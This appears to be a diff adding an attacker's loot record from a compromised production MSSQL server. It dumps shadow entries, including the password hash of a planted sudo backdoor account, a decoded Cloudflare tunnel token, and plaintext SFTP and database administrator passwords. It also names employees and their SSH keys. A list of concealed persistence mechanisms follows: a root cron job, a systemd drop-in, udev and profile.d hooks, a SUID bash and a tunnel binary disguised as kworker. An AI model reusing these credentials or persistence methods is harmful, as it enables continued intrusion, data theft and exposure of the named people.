@@ -1,0 +1,141 @@
+============================================================================
+MSSQL SERVER FILESYSTEM HARVEST — ms-sql-prod-instance (35.219.99.51)
+Harvested: 2026-10-22
+============================================================================
+
+=== /etc/shadow ===
+root:*:19418:0:99999:7:::
+daemon:*:19418:0:99999:7:::
+bin:*:19418:0:99999:7:::
+sys:*:19418:0:99999:7:::
+sync:*:19418:0:99999:7:::
+games:*:19418:0:99999:7:::
+man:*:19418:0:99999:7:::
+lp:*:19418:0:99999:7:::
+mail:*:19418:0:99999:7:::
+news:*:19418:0:99999:7:::
+uucp:*:19418:0:99999:7:::
+proxy:*:19418:0:99999:7:::
+www-data:*:19418:0:99999:7:::
+backup:*:19418:0:99999:7:::
+list:*:19418:0:99999:7:::
+irc:*:19418:0:99999:7:::
+gnats:*:19418:0:99999:7:::
+nobody:*:19418:0:99999:7:::
+systemd-network:*:19418:0:99999:7:::
+systemd-resolve:*:19418:0:99999:7:::
+systemd-timesync:*:19418:0:99999:7:::
+messagebus:*:19418:0:99999:7:::
+syslog:*:19418:0:99999:7:::
+_apt:*:19418:0:99999:7:::
+tss:*:19418:0:99999:7:::
+uuidd:*:19418:0:99999:7:::
+tcpdump:*:19418:0:99999:7:::
+sshd:*:19418:0:99999:7:::
+landscape:*:19418:0:99999:7:::
+pollinate:*:19418:0:99999:7:::
+fwupd-refresh:*:19418:0:99999:7:::
+_chrony:*:19418:0:99999:7:::
+systemd-coredump:!!:19500::::::
+ubuntu:!:19500:0:99999:7:::
+amit.saraswat:*:19500:0:99999:7:::
+lxd:!:19500::::::
+vaibhav:*:19500:0:99999:7:::
+mssql:!:19500::::::
+madhanlingareddy:*:19500:0:99999:7:::
+pasarpolis:*:19515:0:99999:7:::
+arjitsinghal:*:19597:0:99999:7:::
+vaibhav_kaushik:*:19600:0:99999:7:::
+node_exporter:!:19600:0:99999:7:::
+sonam.verma:*:19649:0:99999:7:::
+sai.karthik:*:20125:0:99999:7:::
+mridulpurohit:*:20558:0:99999:7:::
+systemd-networkers:$6$UVg6mfrxmggPTsfD$pXtjuTM76qImAdbWHQyMBQLfUaYhiF9e/mk.1Vr6C.snW7vRAasFyob2cHEbrBfFMLfxJuGv0.hwMbNpbh/n20:20748:0:99999:7:::
+
+=== CLOUDFLARED TOKEN ===
+Raw: eyJhIjoiNTA5MzYyZDU0YjdjMTg5NzA0OGYyOThmNzQ0NmQ3MjEiLCJ0IjoiMzQ1MzNhNDktNGY2My00YWQwLWFlYTctYTIzMWNiOWIyYmFlIiwicyI6IlpXM1ZEYU4xT0YzU2NHeG9PYnRueHVWMFZhVjRoNFFwWldxTDVxUmluOHM9In0=
+Decoded: {"a":"509362d54b7c1897048f298f7446d721","t":"34533a49-4f63-4ad0-aea7-a231cb9b2bae","s":"ZW3VDaN1OF3ScGxoObtnxuV0VaV4h4QpZWqL5qRin8s="}
+
+=== MSSQL CONFIG (/var/opt/mssql/mssql.conf) ===
+[sqlagent]
+enabled = false
+
+[licensing]
+azurebilling = false
+
+[EULA]
+accepteula = Y
+
+=== RESTORE SCRIPT CREDENTIALS (/home/madhanlingareddy/restore_aus_database.sh) ===
+- SFTP Password (SSHPASS): backupaus@2023
+- SFTP Server: aspstore.care.co.id:2031
+- SFTP User: adminaus
+- MSSQL SA Password: 59JlwDgE5QkmHo
+- DW User: dw_user (created as dwuser in SEA_AUS with db_datareader role)
+
+=== RESTORE SQL (/home/madhanlingareddy/restore.sql) ===
+USE [MASTER];
+ALTER DATABASE [SEA_AUS] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
+RESTORE DATABASE [SEA_AUS] FROM DISK = N'/home/madhanlingareddy/SEA_AUS_backup_2025_07_25_191500_5000251.bak' WITH FILE = 1, NORECOVERY, NOUNLOAD, REPLACE, STATS = 5;
+RESTORE DATABASE [SEA_AUS] FROM DISK = N'/home/madhanlingareddy/SEA_AUS_backup_2025_08_19_190000_5874054.bak' WITH FILE = 1, RECOVERY, NOUNLOAD, REPLACE, STATS = 5;
+ALTER DATABASE [SEA_AUS] SET MULTI_USER;
+USE SEA_AUS;
+CREATE USER dwuser FOR LOGIN dw_user;
+ALTER ROLE db_datareader ADD MEMBER dwuser;
+
+=== BOTO CONFIG (/etc/boto.cfg) ===
+[GSUtil]
+default_project_id  = 661016302395
+default_api_version = 2
+[GoogleCompute]
+service_account = default
+
+=== HOME DIRECTORIES ===
+Users: amit.saraswat, arjitsinghal, madhanlingareddy, mridulpurohit, pasarpolis, sai.karthik, sonam.verma, ubuntu, vaibhav, vaibhav_kaushik
+
+=== SSH AUTHORIZED KEYS ===
+/var/opt/mssql/.ssh/authorized_keys (1 key):
+  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFZOUrMhG96c2VtR4Dhh3r2IhwAqXb12W9Dbz1z6kTfG mssql@rce
+
+/home/madhanlingareddy/.ssh/authorized_keys: 176KB (many keys, mssql-owned)
+/home/sai.karthik/.ssh/authorized_keys: present
+/home/mridulpurohit/.ssh/authorized_keys: present
+
+=== GCP PROJECT SSH KEYS (from metadata) ===
+sai.karthik: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... sai.karthik@pasarpolis.com
+mridulpurohit: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5Epy... mridulpurohit@Mriduls-MacBook-Pro.local
+
+=== PERSISTENCE ===
+1. Cron (/etc/cron.d/apt-compat): */1 * * * * root /bin/bash -p /var/opt/mssql/.cache/.sys-monitor
+2. Systemd drop-in (/etc/systemd/system/cron.service.d/10-locale.conf): ExecStartPost for .sys-monitor
+3. rc.local: nohup sys-monitor
+4. profile.d (/etc/profile.d/locale-check.sh): sys-monitor pgrep check
+5. udev rules (/etc/udev/rules.d/85-network-helper.rules): on net add
+6. SUID bash: /var/opt/mssql/.cache/.bash-helper
+
+Persistence user: systemd-networkers / janda354@ (UID 993, sudo NOPASSWD)
+Cloudflared binary: /var/opt/mssql/.cache/.kworker-net (disguised as kworker)
+Cloudflared wrapper: /var/opt/mssql/.cache/.sys-health
+Cloudflared token: /var/opt/mssql/.cache/.tk
+Backup location: /usr/lib/.setuptools/
+
+=== CRON JOBS ===
+madhanlingareddy: restore_aus_database.sh (commented out)
+pasarpolis: (commented out)
+
+=== /tmp FILES ===
+.deploy-sm (21521 bytes) — persistence deploy script
+cloudflared (40MB) — cloudflared binary
+exploit (810KB) — compiled exploit
+vulnerable (810KB) — vulnerability checker
+copyfail.c (14 bytes) — exploit source stub
+fix_ssh.sh, get_token.py, shell.sh — 3.1MB each (tools)
+cb.txt, intresp.txt — HTTP response captures
+
+=== NODE EXPORTER SERVICE ===
+Path: /usr/local/bin/node_exporter
+User: node_exporter
+Port: 9100
+
+=== DISK ===
+/dev/root 2.0T 1.4T 648G 68% /
